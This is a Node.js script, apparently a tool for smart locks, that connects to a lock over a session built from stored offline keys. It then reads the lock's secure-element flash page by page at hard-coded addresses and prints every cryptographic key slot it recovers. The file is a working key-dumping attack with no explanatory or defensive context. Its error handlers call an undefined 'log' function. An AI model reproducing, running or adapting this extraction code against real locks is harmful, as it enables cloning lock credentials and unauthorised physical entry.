const lockScanner = require('./lib/lock_scanner');
const Session = require('./lib/offline_session');
const util = require('util');
const delay = require('./lib/delay');
const cmd = require('./lib/command_builder');
const secEnum = require('./lib/sec/command_enum');
const SecCommand = require('./lib/sec/sec_command');
const environmentConfig = require('../environment.json');
const Environment = require('./lib/environment')
require('./lib/async_logging');

const keyMap = [
  { start: 32196, count: 1, offset: 4, initialSlot: 0, ignoreChecksum: true },
  { start: 17410, count: 99, offset: 4, initialSlot: 1 },
  { start: 17920, count: 100, offset: 0, initialSlot: 100 },
  { start: 18432, count: 57, offset: 0, initialSlot: 200 }
  ];

const environment = new Environment(environmentConfig);

function extractKeys(buffer, offset, initialSlot, count, ignoreChecksum) {
  var results = [];
  for (let i = 0; i < count; i++) {
    var j = offset + i * 20;
    let expectedChecksum = (-(buffer.readInt32LE(j) + buffer.readInt32LE(j + 4)
      + buffer.readInt32LE(j + 8) + buffer.readInt32LE(j + 12))) & 0xFFFFFFFF;
    let readChecksum = buffer.readInt32LE(j + 16);

    if(expectedChecksum == readChecksum || ignoreChecksum) {
      results.push({keySlot:(initialSlot + i), key: buffer.toString('hex', j, j + 16)});
    }
  }
  return results;
}

function printKeys(keys) {
  for (let i = 0; i < keys.length; i++) {
    console.log('KeySlot:' + keys[i].keySlot + ' key:' + keys[i].key);
  }
}

async function onSecResponse(session, state, data) {
  let secCmd = new SecCommand(data);
  if(secEnum.byId[secCmd.commandAsByte] == 'ResponseGetFlashPageData'){
    var i = secCmd.rawBuffer.readUInt16BE(1);
    state.buffer.write(secCmd.parameter1, (i - keyMap[state.part].start) * 8, 'hex');
    state.buffer.write(secCmd.parameter2, (i - keyMap[state.part].start) * 8 + 4, 'hex');

    if((i-keyMap[state.part].start)*8 < 20 * (keyMap[state.part].count) + keyMap[state.part].offset/8) {
      return await session.secWrite(cmd.readSecFlash(i + 1).data);
    }

    //The current part of the keymap has been extracted
    var newResults = extractKeys(state.buffer, keyMap[state.part].offset,
      keyMap[state.part].initialSlot, keyMap[state.part].count, keyMap[state.part].ignoreChecksum);
    state.results = state.results.concat(newResults);
    printKeys(newResults);

    if(state.part++ < keyMap.length - 1) {
      state.buffer = Buffer.alloc(20 * keyMap[state.part].count + keyMap[state.part].offset + 20);
      return await session.secWrite(cmd.readSecFlash(keyMap[state.part].start).data);
    }

    await session.secWrite(cmd.disconnect().data)
    session.disconnect();
  } else {
    console.log('sec->comp', data);
  }
}

async function onSessionStart(session) {
  var mapPartIndex = 0;
  var buffer = Buffer.alloc(20 * keyMap[mapPartIndex].count + keyMap[mapPartIndex].offset + 20);
  var state = { results: [], part: mapPartIndex, buffer: buffer };
  session.on('secUpdate', d=>onSecResponse(session, state, d));
  await session.secWrite(cmd.readSecFlash(keyMap[mapPartIndex].start).data);
}

lockScanner.on('lockFound', async lock => {
  console.log('Connected to', lock.id);
  var keychain = environment.createKeychainForLock(lock.id);
  if(!keychain) {
    console.log('No offline keys for lock.');
    return;
  }

  try {
    var session = new Session(lock, keychain, keychain.preferedKeyId);
    session.once('established', d=>onSessionStart(session));
    lock.on('error', d=>log('err', d));
    session.on('error', d=>log('err', d));
    await session.establish();
  } catch (e) {
    console.log(e);
  }
});

lockScanner.on('error', e => console.log(e));
lockScanner.start();
